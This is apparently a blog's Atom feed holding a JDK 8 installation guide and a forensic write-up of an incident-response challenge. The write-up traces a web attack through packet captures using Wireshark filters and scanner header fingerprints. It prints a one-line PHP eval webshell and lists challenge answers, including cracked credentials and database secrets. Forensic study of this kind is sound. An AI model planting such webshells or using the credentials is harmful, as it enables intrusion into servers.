<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>北极海的博客空间</title>
  
  <subtitle>You do things when the opportunities come along.</subtitle>
  <link href="https://lhhxs.github.io/atom.xml" rel="self"/>
  
  <link href="https://lhhxs.github.io/"/>
  <updated>2022-11-29T03:01:57.014Z</updated>
  <id>https://lhhxs.github.io/</id>
  
  <author>
    <name>Arcticsea</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JAVA JDK 8安装</title>
    <link href="https://lhhxs.github.io/2022/11/29/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/JDK%208u351%E5%AE%89%E8%A3%85/"/>
    <id>https://lhhxs.github.io/2022/11/29/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/JDK%208u351%E5%AE%89%E8%A3%85/</id>
    <published>2022-11-29T02:21:00.905Z</published>
    <updated>2022-11-29T03:01:57.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-安装jdk-8u351"><a href="#linux-安装jdk-8u351" class="headerlink" title="linux 安装jdk 8u351"></a>linux 安装jdk 8u351</h1><h2 id="1、资源文件"><a href="#1、资源文件" class="headerlink" title="1、资源文件"></a>1、资源文件</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1flb3sqbdTcmyXWrCMLmhuA?pwd=xb0k </span><br><span class="line">提取码：xb0k</span><br></pre></td></tr></table></figure><h2 id="2、手动安装"><a href="#2、手动安装" class="headerlink" title="2、手动安装"></a>2、手动安装</h2><p>卸载OPENJDK<br>Linux有些系统默认安装有OpenJDK是JDK的另一种实现。</p><h3 id="1-检查系统中是否已安装JDK"><a href="#1-检查系统中是否已安装JDK" class="headerlink" title="1.检查系统中是否已安装JDK"></a>1.检查系统中是否已安装JDK</h3><p>命令：java -version：查看JDK安装版本，命令执行后显示如下，说明本系统默认已经安装JDK1.8.0_242。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># java -version</span></span><br><span class="line">openjdk version <span class="string">&quot;1.8.0_242&quot;</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_242-b08)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.242-b08, mixed mode)</span><br><span class="line">[root@localhost ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="2-检测系统JDK默认安装包"><a href="#2-检测系统JDK默认安装包" class="headerlink" title="2.检测系统JDK默认安装包"></a>2.检测系统JDK默认安装包</h3><p>命令：rpm -qa | grep java　：命令的意思是搜索java，查看安装包文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># rpm -aq | grep java</span></span><br><span class="line">java-1.8.0-openjdk-headless-1.8.0.242.b08-1.el7.x86_64</span><br><span class="line">python-javapackages-3.4.1-11.el7.noarch</span><br><span class="line">tzdata-java-2019c-1.el7.noarch</span><br><span class="line">javapackages-tools-3.4.1-11.el7.noarch</span><br><span class="line">java-1.8.0-openjdk-1.8.0.242.b08-1.el7.x86_64</span><br><span class="line">[root@localhost ~]<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="3-卸载系统OPENJDK"><a href="#3-卸载系统OPENJDK" class="headerlink" title="3.卸载系统OPENJDK"></a>3.卸载系统OPENJDK</h3><p>卸载命令：rpm -e –nodeps 名称　　　　或者　　　　yum remove <em>openjdk</em><br>之后再次输入命令 查看卸载情况：rpm -qa | grep java　　或者　　java -version</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">卸载命令rpm：</span><br><span class="line">[root@localhost ~]<span class="comment"># rpm -e --nodeps java-1.8.0-openjdk-headless-1.8.0.242.b08-1.el7.x86_64</span></span><br><span class="line">[root@localhost ~]<span class="comment"># rpm -e --nodeps java-1.8.0-openjdk-1.8.0.242.b08-1.el7.x86_64</span></span><br><span class="line">或者</span><br><span class="line">卸载命令yum：</span><br><span class="line">[root@localhost ~]<span class="comment"># yum remove *openjdk*</span></span><br><span class="line">检查</span><br><span class="line">[root@localhost root]$ java -version</span><br><span class="line">bash: java: 未找到命令...</span><br><span class="line">或者</span><br><span class="line">[root@localhost ~]<span class="comment"># rpm -qa | grep java</span></span><br><span class="line">python-javapackages-3.4.1-11.el7.noarch</span><br><span class="line">tzdata-java-2019c-1.el7.noarch</span><br><span class="line">javapackages-tools-3.4.1-11.el7.noarch</span><br></pre></td></tr></table></figure><h3 id="4-安装JDK"><a href="#4-安装JDK" class="headerlink" title="4.安装JDK"></a>4.安装JDK</h3><p>进入用户根目录，创建一个文件夹downfile，用于保存上传的文件。这一步骤不是必须的，本次操作仅是为了便于后期软件、文档的管理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########进入根目录创建downfile目录：用于存放上传的软件</span></span><br><span class="line">[root@localhost /]<span class="comment"># cd  ~</span></span><br><span class="line">[root@localhost /]<span class="comment"># mkdir downfile</span></span><br></pre></td></tr></table></figure><p>上传压缩包并解压到JVM文件夹（推荐安装在&#x2F;usr&#x2F;local&#x2F;目录下）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########利用Xftp上传从Oracle官网下载的JDK到该目录中：上传后查看是否存在</span></span><br><span class="line">[root@localhost /]<span class="comment"># cd downfile</span></span><br><span class="line">[root@localhost downfile]<span class="comment"># ll</span></span><br><span class="line">总用量 139760</span><br><span class="line">-rw-r--r--. 1 root root 143111803 10月 14 18:04 jdk-8u261-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">########解压JDK到指定的目录，如果不存在请建立该目录：/usr/lib/jvm</span></span><br><span class="line">[root@localhost downfile]<span class="comment"># tar -xvf jdk-8u261-linux-x64.tar.gz -C /usr/lib/jvm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">########进入目录检查是否有文件</span></span><br><span class="line">[root@localhost downfile]<span class="comment"># cd /usr/lib/jvm</span></span><br><span class="line">[root@localhost downfile]<span class="comment"># ll</span></span><br><span class="line">总用量 0</span><br><span class="line">drwxr-xr-x. 3 root  root   17 9月  30 12:25 java-1.8.0-openjdk-1.8.0.242.b08-1.el7.x86_64</span><br><span class="line">drwxr-xr-x. 8 10143 10143 273 6月  18 14:59 jdk1.8.0_261</span><br></pre></td></tr></table></figure><p>软件安装地址允许自定义，但通常Linux系统安装软件推荐放在&#x2F;usr目录下（该目录等价于windows下的Program files）。<br>JDK下载之命令方式：选择使用Linux下载工具下载，这种下载方式，默认下载地址为当前用户所在目录！关于下载连接是在官网复制的（选择下载连接，右键获取连接地址即可）<br>命令格式如下：<br>wget <a href="https://download.oracle.com/otn/java/jdk/8u261-b12/a4634525489241b9a9e1aa73d9e118e6/jdk-8u261-linux-x64.tar.gz">https://download.oracle.com/otn/java/jdk/8u261-b12/a4634525489241b9a9e1aa73d9e118e6/jdk-8u261-linux-x64.tar.gz</a></p><h3 id="5-配置环境变量"><a href="#5-配置环境变量" class="headerlink" title="5.配置环境变量"></a>5.配置环境变量</h3><p>Linux环境变量配置都在：&#x2F;etc&#x2F;profile文件中，Linux环境变量配置都在：&#x2F;etc&#x2F;profile文件中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#####vim打开编辑文件</span></span><br><span class="line">[root@localhost ~]<span class="comment"># vim /etc/profile</span></span><br><span class="line"> ………略………</span><br><span class="line">按键 i 进入插入编辑模式。</span><br><span class="line"></span><br><span class="line"><span class="comment">###编辑模式下，在结尾或开头添加如下：编辑模式下，在结尾或开头添加如下：</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/jdk1.8.0_261</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###重点说明：</span></span><br><span class="line"><span class="comment">###1、在window系统中环境变量分隔符使用“分号”，在Linux系统中使用“冒号”。</span></span><br><span class="line"><span class="comment">###2、在Linjux系统中“变量名”标识取值的意思。</span></span><br><span class="line"><span class="comment">###3、以上PATH变量的值除了设置了JAVA环境外，还取用了另一个PATH的值，这个被取用的PATH值，实际指向Linux命令集，如果没有该配置，Linux命令将无法使用（使用就显示未找到命令）！</span></span><br><span class="line">[root@localhost ~]<span class="comment"># source /etc/profile</span></span><br></pre></td></tr></table></figure><h3 id="6-检查新安装的JDK"><a href="#6-检查新安装的JDK" class="headerlink" title="6.检查新安装的JDK"></a>6.检查新安装的JDK</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># java -version</span></span><br><span class="line">[root@localhost ~]<span class="comment"># java</span></span><br><span class="line">[root@localhost ~]<span class="comment"># javac</span></span><br></pre></td></tr></table></figure><h2 id="linux-yum安装"><a href="#linux-yum安装" class="headerlink" title="linux yum安装"></a>linux yum安装</h2><p>（本人未测试该方式，所以如需配置环境变量，请按手动说明配置即可）</p><h3 id="1-查询JDK可用版本"><a href="#1-查询JDK可用版本" class="headerlink" title="1.查询JDK可用版本"></a>1.查询JDK可用版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y list java*</span><br><span class="line">或者</span><br><span class="line">yum search java | grep -i --color JDK</span><br></pre></td></tr></table></figure><h3 id="2-选择安装JDK"><a href="#2-选择安装JDK" class="headerlink" title="2.选择安装JDK"></a>2.选择安装JDK</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum  install  -y  java-1.8.0-openjdk.x86_64</span><br></pre></td></tr></table></figure><h3 id="3-检测安装"><a href="#3-检测安装" class="headerlink" title="3.检测安装"></a>3.检测安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># java -version</span></span><br><span class="line">[root@localhost ~]<span class="comment"># java</span></span><br><span class="line">[root@localhost ~]<span class="comment"># javac</span></span><br></pre></td></tr></table></figure><h1 id="WINDOWS安装java-8（JDK1-8U321）"><a href="#WINDOWS安装java-8（JDK1-8U321）" class="headerlink" title="WINDOWS安装java 8（JDK1.8U321）"></a>WINDOWS安装java 8（JDK1.8U321）</h1><h2 id="JDK下载"><a href="#JDK下载" class="headerlink" title="JDK下载"></a>JDK下载</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载官网：Java Downloads | Oracle</span><br><span class="line">下载版本：jdk-8u321-windows-x64.exe</span><br><span class="line">百度网盘：链接：https://pan.baidu.com/s/1F43G56vjd5JtZXxbkQJlIA   提取码：8888</span><br></pre></td></tr></table></figure><h2 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h2><p>安装Java8包括jdk1.8和jre1.8，双击已下载好的安装包即可：<br>1、点击已下载好的安装包，进入Java8安装向导，点击下一步：<br>2、修改安装路径，自行修改<br>3、进入安装过程，等待安装完成<br>4、安装jre1.8，修改jre的安装路径，建议放在jdk同级目录<br>5、jre安装过程，等待完成<br>6、安装完成<br>7、安装完成后可在你的控制面板–&gt;程序和功能 中看到以下两个程序：java 8 Update 321 (64-bit)、Java SE Development Kit 8 Update 321 (64-bit)</p><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>我的电脑右键属性（win11则在系统控制面板找到关于） –&gt; 高级系统设置 –&gt; 环境变量</p><h3 id="1）新建JAVA-HOME变量，添加："><a href="#1）新建JAVA-HOME变量，添加：" class="headerlink" title="1）新建JAVA_HOME变量，添加："></a>1）新建JAVA_HOME变量，添加：</h3><p>变量名：JAVA_HOME<br>变量值：D:\Program Files\Java\jdk1.8.0_321</p><h3 id="2）配置PATH路径"><a href="#2）配置PATH路径" class="headerlink" title="2）配置PATH路径"></a>2）配置PATH路径</h3><p>找到系统变量中的PATH<br>配置bin目录<br>新建 –&gt; 输入        %JAVA_HOME%\bin</p><h2 id="验证是否安装成功"><a href="#验证是否安装成功" class="headerlink" title="验证是否安装成功"></a>验证是否安装成功</h2><p>打开Windows的运行（可用win+R快捷键打开），输入cmd<br>验证Java版本：java -version<br>验证Java编译命令是否可用：javac</p><p>大功告成，开始码代码吧，童鞋们！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux-安装jdk-8u351&quot;&gt;&lt;a href=&quot;#linux-安装jdk-8u351&quot; class=&quot;headerlink&quot; title=&quot;linux 安装jdk 8u351&quot;&gt;&lt;/a&gt;linux 安装jdk 8u351&lt;/h1&gt;&lt;h2 id=&quot;1、资源文</summary>
      
    
    
    
    <category term="code" scheme="https://lhhxs.github.io/categories/code/"/>
    
    
    <category term="JDK" scheme="https://lhhxs.github.io/tags/JDK/"/>
    
  </entry>
  
  <entry>
    <title>安恒8月应急响应题目回顾</title>
    <link href="https://lhhxs.github.io/2022/09/29/writeup/%E5%AE%89%E6%81%928%E6%9C%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%A2%98%E7%9B%AE%E5%9B%9E%E9%A1%BE/"/>
    <id>https://lhhxs.github.io/2022/09/29/writeup/%E5%AE%89%E6%81%928%E6%9C%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%A2%98%E7%9B%AE%E5%9B%9E%E9%A1%BE/</id>
    <published>2022-09-29T10:27:34.540Z</published>
    <updated>2022-10-22T03:47:28.316Z</updated>
    
    <content type="html"><![CDATA[<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、给出黑客使用的扫描器</span><br><span class="line">2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</span><br><span class="line">3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</span><br><span class="line">4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</span><br><span class="line">5、黑客在robots.txt中找到的flag是什么</span><br><span class="line">6、黑客找到的数据库密码是多少</span><br><span class="line">7、黑客在数据库中找到的hash_code是什么</span><br><span class="line">8、黑客破解了账号ijnu@test.com得到的密码是什么</span><br><span class="line">9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</span><br><span class="line">10、黑客使用了什么账号登陆了mail系统（形式: username/password）</span><br><span class="line">11、黑客获得的vpn,ip是多少</span><br></pre></td></tr></table></figure><blockquote><p>还得了解一下一些前置的知识</p></blockquote><blockquote><p>过滤IP，如源IP或者目标 x.x.x.x  </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr == x.x.x.x</span><br></pre></td></tr></table></figure><p>过滤端口  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br></pre></td></tr></table></figure><p>过滤MAC  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.dst ==A0:00:00:04:C5:84</span><br></pre></td></tr></table></figure><blockquote><p>http模式过滤(就是一种模糊匹配)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><blockquote><p>一些常见的自动化工具的指纹</p></blockquote><blockquote><p>Awvs（Acunetix Web Vulnerability Scanner ）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><blockquote><p>感觉我们只需要http contains wvs 或者是 http contains acunetix就可以把包给筛选出来</p></blockquote><blockquote><p>Netsparker</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><blockquote><p>Appscan</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><blockquote><p>Nessus</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><blockquote><p>Sqlmap</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap8#stable</span><br></pre></td></tr></table></figure><h4 id="1、给出黑客使用的扫描器"><a href="#1、给出黑客使用的扫描器" class="headerlink" title="1、给出黑客使用的扫描器"></a>1、给出黑客使用的扫描器</h4><blockquote><p>竟然是黑客攻击，就应该把把http过滤看一下或者直接搜就行<br>Pj0s39.md.png<br>所以这一题的答案是awvs</p></blockquote><h4 id="2、得到黑客扫描到的登陆后台是-相对路径即可-x2F-admin-x2F-login-php"><a href="#2、得到黑客扫描到的登陆后台是-相对路径即可-x2F-admin-x2F-login-php" class="headerlink" title="2、得到黑客扫描到的登陆后台是(相对路径即可) &#x2F;admin&#x2F;login.php"></a>2、得到黑客扫描到的登陆后台是(相对路径即可) &#x2F;admin&#x2F;login.php</h4><blockquote><p>通常后台的名字包括</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><blockquote><p>所以我们直接搜其中的一个输入命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>Pj0ycR.md.png<br>前面的都是登陆的页面，那个password_reset应该是密码重置<br>所以这一题的答案应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/login.php?rec=login</span><br></pre></td></tr></table></figure><h3 id="3、得到黑客使用了什么账号密码登陆了web后台-形式-username-x2F-password"><a href="#3、得到黑客使用了什么账号密码登陆了web后台-形式-username-x2F-password" class="headerlink" title="3、得到黑客使用了什么账号密码登陆了web后台(形式:username&#x2F;password)"></a>3、得到黑客使用了什么账号密码登陆了web后台(形式:username&#x2F;password)</h3><blockquote><p>也是同样的套路<br>输入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure><blockquote><p>这个我找得有点久，因为答案在最后，中间还有其他可以登陆上去的用户有一个还像是人事，还有两外一个好像是设么simple啥的，看了这整个包，发现simple这个账号有好几次改密码的操作，人事也登陆了几次，这些混淆都给这题提高难度，如果你真的仔细分析这个包的话就会发现，这里面黑客是大概爆破了几次，中间还尝试了一波SQL注入，而且爆破的过程都是用的admin账户，这也暗示了为什么最后的登陆的用户名是admin了，这里的话登陆成功可以看长度，对比爆破跟正常人事的登录，成功的话一般长度都是750+，没成功的话一般都是730+<br>Pj06j1.md.png<br>所以第三题的答案是</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin!@#pass123</span><br></pre></td></tr></table></figure><h4 id="4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码"><a href="#4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码" class="headerlink" title="4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码"></a>4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</h4><blockquote><p>通常webshell都会有明显的关键字比如eval、assert之类的，还有各种回调函数就不多说了。<br>我们这里也是一样的套路  </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 1159 and http contains &quot;eval&quot;</span><br></pre></td></tr></table></figure><p> 一看这不太正常的文件名，有很大机会就是webshell了，而且里面的内容含有z1这样的参数很大可能性就是菜刀连接的流量，所以文件名是<code>/image/article/a.php</code><br>Pj02B6.md.png</p><blockquote><p>所以这题的答案是  </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval([1234]);?&gt;</span><br></pre></td></tr></table></figure><p>的base64编码</p><h4 id="5、黑客在robots-txt中找到的flag是什么"><a href="#5、黑客在robots-txt中找到的flag是什么" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么"></a>5、黑客在robots.txt中找到的flag是什么</h4><blockquote><p>正常操作</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></figure><p>然后追踪流就好了<br>Pj0I9H.md.png<br>这题的答案就是上图的flag</p><h4 id="6、黑客找到的数据库密码是多少"><a href="#6、黑客找到的数据库密码是多少" class="headerlink" title="6、黑客找到的数据库密码是多少"></a>6、黑客找到的数据库密码是多少</h4><blockquote><p>对于这题的数据库操作，先把马给过滤出来，然后再从里面找他的response，因为这里黑客是通过马对数据库操作的<br>可以先标记一下<code>a.php</code>第一次出现的地方，然后过滤http一条条去看他们的response就可以了，要是想详细一点的话可以加上db等字样，这就是做题时候的一些小技巧了。。可能恰好一样的效率有点低<br>Pj0XE8.md.png<br>所以这题的答案就是<code>e667jUPvJjXHvEUv</code></p></blockquote><h4 id="7、黑客在数据库中找到的hash-code是什么"><a href="#7、黑客在数据库中找到的hash-code是什么" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么"></a>7、黑客在数据库中找到的hash_code是什么</h4><blockquote><p>这个题目明显的就是说在数据库里面找到的hash_code，但是在第一个包里面使用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;hsah_code&quot;</span><br></pre></td></tr></table></figure><p>只找到一个响应报文，里面什么都找不到，这时候我们别忘了有第二个包的存在，我就是经常忘了。。这种做题习惯得改改，太浮躁，一旦发现没有就不做了。。。<br>我们来对比一下两个包的协议分级，很明显第二包里面大多数都是mysql的操作，所以很大可能性就是这个包里面存在我们要的答案<br>第一个包应用层大部分都是html的响应<br>PjBpgs.md.png<br>而第二个包明显了，直接在tcp协议上执行的Mysql操作<br>PjB9vn.md.png<br>我们可以在第二个包里面用mysql的过滤，如果是想搜索执行语句的话最好这样子，如：mysql.query contains SELECT<br>类似的模糊匹配  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;hash_code&quot;</span><br></pre></td></tr></table></figure><p>然后随便找个response追踪流看一下，发现答案<br>PjBiD0.md.png<br>这题答案是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d1c029893df40cb0f47bcf8f1c3c17ac</span><br></pre></td></tr></table></figure><h4 id="8、黑客破解了账号-105-x6a-x6e-x75-x40-x74-101-x73-x74-46-99-111-x6d-得到的密码是什么"><a href="#8、黑客破解了账号-105-x6a-x6e-x75-x40-x74-101-x73-x74-46-99-111-x6d-得到的密码是什么" class="headerlink" title="8、黑客破解了账号&#105;&#x6a;&#x6e;&#x75;&#x40;&#x74;&#101;&#x73;&#x74;&#46;&#99;&#111;&#x6d;得到的密码是什么"></a>8、黑客破解了账号<a href="mailto:&#105;&#x6a;&#x6e;&#x75;&#x40;&#x74;&#101;&#x73;&#x74;&#46;&#99;&#111;&#x6d;">&#105;&#x6a;&#x6e;&#x75;&#x40;&#x74;&#101;&#x73;&#x74;&#46;&#99;&#111;&#x6d;</a>得到的密码是什么</h4><blockquote><p>这一题一开始我还以为答案在mail的那两个包里面，结果还是在对sql操作的那个包上面，上来就直接</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;ijnu@test.com&quot;</span><br></pre></td></tr></table></figure><p>啥都没发现，这题目感觉出题没说得太明白。。<br>后面就用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;ijnu@test.com&quot;</span><br></pre></td></tr></table></figure><p>把包筛出来，并且追踪流就行了，当然这题也可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;ijnu@test.com&quot;</span><br></pre></td></tr></table></figure><p> 把包筛出来<br>一样的效果<br>PjBV5F.md.png<br>这题明显密码经过MD5加密的，所以这题得去somd5上解密<br>这题的答案是<code>edc123!@#</code></p><h4 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</h4><blockquote><p>在webone的那个包里面直接搜索就可以得到<br><code>http contains &quot;eth&quot;</code><br>PjBm8J.md.png<br>或者你也可以直接从webtwo的包里面直接看到内网ip，这也对应了题目后面内网渗透之后，用vpn连接的过程<br>也就是从</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 